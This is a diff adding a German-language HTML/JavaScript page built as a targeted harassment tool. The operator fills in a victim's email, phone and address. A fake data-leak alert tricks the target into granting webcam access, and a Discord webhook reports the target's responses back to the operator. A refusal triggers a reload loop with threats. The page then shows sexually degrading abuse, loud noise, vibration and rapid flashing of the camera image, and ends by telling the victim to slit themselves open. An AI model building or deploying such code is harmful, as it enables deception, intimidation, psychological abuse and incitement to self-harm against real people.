@@ -1,6 +1,167 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <title>SECURE_VAULT_77</title>
+    <style>
+        :root { --main: #f00; --dim: #500; --bg: #050000; }
+        body {
+            margin: 0; background-color: var(--bg); color: var(--main);
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden; width: 100vw; overscroll-behavior: none;
+        }
+
+        /* --- GATEKEEPER UI (DER KÖDER) --- */
+        #gate {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 20px;
+            font-size: 0.8rem; letter-spacing: 1px;
+            background: radial-gradient(circle, #100 0%, #000 90%);
+        }
+
+        .term-text { max-width: 85%; text-align: left; margin-bottom: 30px; color: #aaa; line-height: 1.4; }
+        .highlight { color: #fff; font-weight: bold; border-bottom: 1px solid #fff; }
+        
+        #btn-init {
+            background: #000; border: 1px solid #f00; color: #f00;
+            padding: 20px 30px; font-family: inherit; font-size: 1rem; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s;
+            box-shadow: 0 0 20px #500; width: 90%; font-weight: 900;
+        }
+        #btn-init:active { background: #f00; color: #000; }
+
+        /* --- DOSSIER LEAK (DER DRUCK) --- */
+        #dossier-box {
+            display: none; border: 2px solid #f00; background: #200; 
+            padding: 15px; width: 90%; margin-bottom: 20px;
+            text-align: left; font-size: 0.8rem; color: #fff;
+            box-shadow: inset 0 0 30px #000, 0 0 15px #f00;
+            animation: glitch 0.1s infinite;
+        }
+        .pii-row { margin-bottom: 8px; border-bottom: 1px dashed #f00; padding-bottom: 4px; }
+        .pii-label { color: #f88; font-size: 0.7rem; }
+        .pii-val { color: #fff; font-weight: bold; float: right; letter-spacing: 1px; }
+
+        /* --- TYPOGRAFIE DES HORRORS --- */
+        .flesh-font {
+            font-family: 'Times New Roman', serif; font-style: italic; color: #b99;
+            text-shadow: 0 0 5px #500;
+        }
+        .bleed {
+            color: #800; text-shadow: 0 10px 5px #300, 0 20px 10px #200;
+            animation: dripping 3s infinite ease-in-out;
+        }
+        .rot {
+            color: #8a7f6b; filter: blur(0.5px) contrast(150%);
+            text-shadow: 2px 2px 4px rgba(255,255,255,0.3);
+            font-family: 'Courier New', monospace; letter-spacing: -2px;
+        }
+        .demon {
+            font-size: clamp(3rem, 12vw, 6rem) !important; color: #f00;
+            text-transform: uppercase; font-weight: 900; mix-blend-mode: exclusion;
+            animation: seizure 0.1s infinite; text-shadow: 4px 0 #fff, -4px 0 #0f0;
+        }
+        .whisper {
+            font-size: 1rem !important; letter-spacing: 10px; opacity: 0.6 !important;
+            color: #fff; font-family: sans-serif; text-transform: lowercase;
+        }
+        .latin {
+            font-family: 'Times New Roman', serif; color: #666;
+            font-size: 1rem !important; letter-spacing: 6px; font-style: italic;
+            opacity: 0.8 !important; text-transform: uppercase;
+            border-top: 1px solid #333; border-bottom: 1px solid #333;
+            padding: 10px 0; margin-top: -20px;
+        }
+
+        /* --- HAUPT INHALT --- */
+        #shaft { display: none; height: 14000px; position: relative; width: 100%; background: linear-gradient(#000, #100, #200); }
+        
+        #scroll-hint {
+            position: fixed; bottom: 80px; left: 0; width: 100%; text-align: center;
+            color: #fff; font-weight: bold; font-size: 1.5rem;
+            animation: bounce 1.5s infinite; pointer-events: none; z-index: 500;
+            display: none; text-shadow: 0 0 20px #f00; letter-spacing: 5px;
+        }
+
+        .msg {
+            position: absolute; width: 90%; left: 5%; text-align: center;
+            font-size: clamp(1.8rem, 7vw, 3.5rem); font-weight: 900;
+            opacity: 0; transition: opacity 0.2s; color: #ccc;
+            text-transform: uppercase; word-wrap: break-word; overflow-wrap: break-word; hyphens: auto;
+            text-shadow: 2px 2px 0 #500; pointer-events: none; line-height: 1.1;
+        }
+        
+        #mirror { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: none; background: #000; }
+        
+        video {
+            width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
+            filter: sepia(100%) saturate(600%) contrast(300%) brightness(0.6) hue-rotate(-50deg) url(#horror-melt);
+        }
+        
+        #final-overlay {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 95%; text-align: center; color: #f00; 
+            font-size: clamp(3rem, 10vw, 5rem); font-weight: 900; 
+            text-shadow: 0 0 40px #f00; mix-blend-mode: color-dodge; word-break: break-word;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(20px);} }
+        @keyframes dripping { 0% { transform: scaleY(1); } 50% { transform: scaleY(1.1); } 100% { transform: scaleY(1); } }
+        @keyframes seizure { 0% { transform: translate(2px, 2px) skewX(20deg); } 50% { transform: translate(-2px, -2px) skewX(-20deg); } 100% { transform: translate(0, 0); } }
+        @keyframes glitch { 0% { transform: translate(0,0); opacity: 1; } 20% { transform: translate(-2px, 1px); opacity: 0.9; } 40% { transform: translate(1px, -2px); opacity: 1; } 60% { transform: translate(-2px, 0px); opacity: 0.8; } 80% { transform: translate(2px, 2px); opacity: 1; } 100% { transform: translate(0,0); opacity: 1; } }
+        
+        svg { position: absolute; width:0; height:0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <filter id="horror-melt" x="-20%" y="-20%" width="140%" height="140%">
+            <feTurbulence type="turbulence" baseFrequency="0.01" numOctaves="5" result="turbulence" seed="1">
+                <animate attributeName="baseFrequency" dur="8s" values="0.01;0.03;0.01" repeatCount="indefinite" />
+            </feTurbulence>
+            <feDisplacementMap in="SourceGraphic" in2="turbulence" scale="150" xChannelSelector="R" yChannelSelector="G" />
+        </filter>
+    </svg>
+
+    <div id="gate">
+        <h1 style="color:#f00; border-bottom: 2px solid #f00; padding-bottom: 10px; letter-spacing: 2px;">SYSTEM ALERT: 0x84</h1>
+        
+        <div id="dossier-box">
+            <div style="text-align:center; color:#fff; margin-bottom:15px; font-weight:bold; letter-spacing:1px;">SUBJEKT IDENTIFIZIERT</div>
+            <div class="pii-row"><span class="pii-label">EMAIL_ID:</span> <span class="pii-val" id="disp-mail"></span></div>
+            <div class="pii-row"><span class="pii-label">PHONE_ID:</span> <span class="pii-val" id="disp-tel"></span></div>
+            <div class="pii-row"><span class="pii-label">GEO_LOC:</span> <span class="pii-val" id="disp-addr"></span></div>
+            <div style="margin-top:15px; color:#f00; text-align:center; font-weight:900; letter-spacing:1px;">DATEN WERDEN SYNCHRONISIERT...</div>
+        </div>
+
+        <div class="term-text" id="intro-text">
+            UNBEFUGTER ZUGRIFF AUF DEIN DIGITALES PROFIL FESTGESTELLT.<br><br>
+            Ein automatisierter Prozess lädt derzeit dein privates Archiv auf einen öffentlichen Server.<br><br>
+            <span class="highlight">STATUS: UPLOAD LÄUFT...</span><br><br>
+            Um den Upload zu stoppen, ist eine sofortige <b>biometrische Verifizierung</b> (Gesichtsscan) erforderlich.
+        </div>
+        <button id="btn-init" onclick="initializeSystem()">IDENTITÄT BESTÄTIGEN & UPLOAD STOPPEN</button>
+        <div id="status-log" style="margin-top:20px; color:#a00; font-size:0.8rem; font-weight:bold; min-height: 20px;"></div>
+    </div>
+
+    <div id="mirror">
+        <video id="cam" playsinline autoplay muted></video>
+        <div id="final-overlay"></div>
+    </div>
+
+    <div id="scroll-hint">ABSTIEG BEGINNEN<br>⇩</div>
+
     <div id="shaft">
         <div class="msg flesh-font" style="top: 800px">
             Systemstatus:<br><span style="color:#f00; font-weight:bold;">OFFENES LOCH</span>
+        </div>
+        <div class="msg latin" style="top: 1100px">
+            CARO DATA VERMIBUS<br>(Fleisch für die Würmer)
         </div>
 
         <div class="msg rot" style="top: 1500px">
@@ -9,6 +170,10 @@
 
         <div class="msg" style="top: 2500px">
             Warum bist du noch hier?<br>Du hättest längst<br>fliehen können.
+        </div>
+        
+        <div class="msg latin" style="top: 3200px">
+            OCULUS NON SATURATUR VISU
         </div>
 
         <div class="msg bleed" style="top: 3800px">
@@ -19,12 +184,20 @@
             Dein Daumen streichelt<br>das Glas wie<br>eine Klitoris.
         </div>
 
+        <div class="msg latin" style="top: 6000px">
+            CORPUS VILE
+        </div>
+
         <div class="msg rot" style="top: 6500px">
             Du willst sehen,<br>wie tief der Ekel geht.<br>Gib es zu, Sau.
         </div>
 
         <div class="msg" style="top: 8000px">
             Du scrollst weiter.<br>Du bettelst darum,<br>besudelt zu werden.
+        </div>
+        
+        <div class="msg latin" style="top: 8800px">
+            PERVERSITAS TUA TE JUDICAT
         </div>
 
         <div class="msg whisper" style="top: 9500px">
@@ -33,6 +206,10 @@
 
         <div class="msg bleed" style="top: 11000px">
             DANN LASS MICH TIEF<br>IN DEINE GEDÄRME.
+        </div>
+        
+        <div class="msg latin" style="top: 11800px">
+            EGO TE INTUS SENTIO
         </div>
 
         <div class="msg demon" style="top: 12500px">
@@ -43,3 +220,197 @@
             DU BIST EINE<br>WIDERLICHE MISSGEBURT.
         </div>
     </div>
+
+    <script>
+        // ======================================================
+        // >>> KONFIGURATION: HIER DATEN EINFÜGEN <<<
+        // ======================================================
+        const VICTIM_MAIL = "MUSTER_EMAIL@YAHOO.COM"; // HIER ÄNDERN
+        const VICTIM_TEL = "+43 000 0000000";         // HIER ÄNDERN
+        const VICTIM_ADDR = "1010 Wien, Musterstraße"; // HIER ÄNDERN
+        const WEBHOOK_URL = ""; // Optional: Discord URL
+        // ======================================================
+
+        const btn = document.getElementById('btn-init');
+        const log = document.getElementById('status-log');
+        const dossier = document.getElementById('dossier-box');
+        let audioCtx, osc, noise;
+
+        // Setze die Daten
+        document.getElementById('disp-mail').innerText = VICTIM_MAIL;
+        document.getElementById('disp-tel').innerText = VICTIM_TEL;
+        document.getElementById('disp-addr').innerText = VICTIM_ADDR;
+
+        sendDiscord("SUBJEKT IST AM GATE.");
+
+        async function initializeSystem() {
+            btn.disabled = true;
+            btn.style.opacity = "0.5";
+            
+            if(document.documentElement.requestFullscreen) {
+                try { await document.documentElement.requestFullscreen(); } catch(e){}
+            }
+
+            initAudio();
+
+            // DER DRUCK AUFBAU
+            log.innerText = "> SCANNE NACH BEKANNTEN PROFILEN...";
+            await wait(1500); 
+
+            // DOSSIER ERSCHEINT
+            dossier.style.display = "block";
+            if(navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
+            
+            log.innerText = "> TREFFER IN DATENBANK!";
+            log.style.color = "#f00";
+            await wait(1500);
+
+            log.innerText = "> KAMERA-ABGLEICH ERFORDERLICH...";
+            await wait(500);
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                document.getElementById('cam').srcObject = stream;
+                
+                // PSYCHO-TRICK: Daten bleiben stehen, System bestätigt ihn
+                log.innerText = "> GESICHTS-SCAN ERFOLGREICH.";
+                await wait(1000);
+                log.innerText = "> ÜBEREINSTIMMUNG BESTÄTIGT.";
+                log.style.color = "#0f0";
+                
+                sendDiscord("ZUGRIFF ERLAUBT!");
+
+                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
+                }
+
+                btn.innerText = "IDENTITÄT VERIFIZIERT";
+                btn.style.borderColor = "#0f0";
+                btn.style.color = "#0f0";
+                btn.style.background = "#020";
+
+                // PAUSE ZUM REALISIEREN
+                await wait(3000);
+                
+                log.innerText = "> STARTE DATEN-TRANSFUSION...";
+
+                setTimeout(() => {
+                    document.getElementById('gate').style.opacity = 0;
+                    setTimeout(() => {
+                        document.getElementById('gate').style.display = 'none';
+                        document.getElementById('shaft').style.display = 'block';
+                        document.getElementById('scroll-hint').style.display = 'block';
+                        window.monitoring = true;
+                    }, 1000);
+                }, 1500);
+
+            } catch (err) {
+                // ZWANGS-LOOP BEI ABLEHNUNG
+                sendDiscord("ZUGRIFF VERWEIGERT.");
+                document.body.style.background = "#fff";
+                setTimeout(() => {
+                    alert("FEHLER: WIR HABEN DEINE DATEN BEREITS:\n" + VICTIM_ADDR + "\n\nBESTÄTIGE JETZT.");
+                    location.reload();
+                }, 100);
+            }
+        }
+
+        function sendDiscord(msg) {
+            if(!WEBHOOK_URL) return;
+            fetch(WEBHOOK_URL, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: msg })
+            }).catch(e => console.log(e));
+        }
+
+        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        function initAudio() {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            osc = audioCtx.createOscillator();
+            osc.type = 'sawtooth';
+            osc.frequency.value = 40;
+            const oscGain = audioCtx.createGain();
+            oscGain.gain.value = 0.5;
+            osc.connect(oscGain);
+            oscGain.connect(audioCtx.destination);
+            osc.start();
+
+            const bufferSize = audioCtx.sampleRate * 2;
+            const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+            const data = buffer.getChannelData(0);
+            for (let i = 0; i < bufferSize; i++) { data[i] = (Math.random() * 2 - 1) * 0.5; }
+            noise = audioCtx.createBufferSource();
+            noise.buffer = buffer;
+            noise.loop = true;
+            window.noiseGain = audioCtx.createGain();
+            window.noiseGain.gain.value = 0;
+            noise.connect(window.noiseGain);
+            window.noiseGain.connect(audioCtx.destination);
+            noise.start();
+        }
+
+        let climax = false;
+        window.addEventListener('scroll', () => {
+            if(!window.monitoring) return;
+            
+            if(window.scrollY > 200) document.getElementById('scroll-hint').style.display = 'none';
+
+            const max = document.body.scrollHeight - window.innerHeight;
+            const per = window.scrollY / max;
+
+            if(osc) osc.frequency.setTargetAtTime(40 + (per * 300), audioCtx.currentTime, 0.1);
+            if(window.noiseGain) window.noiseGain.gain.setTargetAtTime(per * 0.9, audioCtx.currentTime, 0.1);
+
+            document.querySelectorAll('.msg').forEach(m => {
+                const r = m.getBoundingClientRect();
+                if(r.top < window.innerHeight/1.5 && r.bottom > 0) {
+                    m.style.opacity = 1;
+                    m.style.transform = `scale(${1 + (per * 0.2)}) rotate(${(Math.random()-0.5)*5}deg)`;
+                    if(navigator.vibrate && Math.random() > 0.8) navigator.vibrate(30);
+                } else {
+                    m.style.opacity = 0;
+                }
+            });
+
+            if(per > 0.99 && !climax) {
+                triggerClimax();
+            }
+        });
+
+        function triggerClimax() {
+            climax = true;
+            document.body.style.overflow = 'hidden';
+            if(navigator.vibrate) navigator.vibrate([1000, 100, 1000, 100, 1000]); 
+
+            const freqs = [700, 5000, 9000, 12000, 100]; 
+            freqs.forEach(f => {
+                const s = audioCtx.createOscillator();
+                s.type = 'sawtooth'; s.frequency.value = f; s.detune.value = Math.random() * 500;
+                const g = audioCtx.createGain(); g.gain.value = 1.0; 
+                s.connect(g); g.connect(audioCtx.destination); s.start();
+                s.frequency.exponentialRampToValueAtTime(f * 1.5, audioCtx.currentTime + 0.5);
+                s.frequency.exponentialRampToValueAtTime(f * 0.5, audioCtx.currentTime + 3);
+            });
+
+            document.getElementById('mirror').style.display = 'block';
+            const txt = document.getElementById('final-overlay');
+            
+            txt.innerText = `HURE DES SYSTEMS\n\SCHLITZ DICH AUF`; 
+            
+            let active = false;
+            setInterval(() => {
+                active = !active;
+                txt.style.color = active ? "#fff" : "#f00";
+                const v = document.getElementById('cam');
+                if(active) {
+                        v.style.filter = "invert(1) contrast(500%)";
+                } else {
+                        v.style.filter = "sepia(100%) saturate(600%) contrast(300%) hue-rotate(-50deg) brightness(0.6) url(#horror-melt)";
+                }
+            }, 40);
+        }
+    </script>
+</body>
+</html>
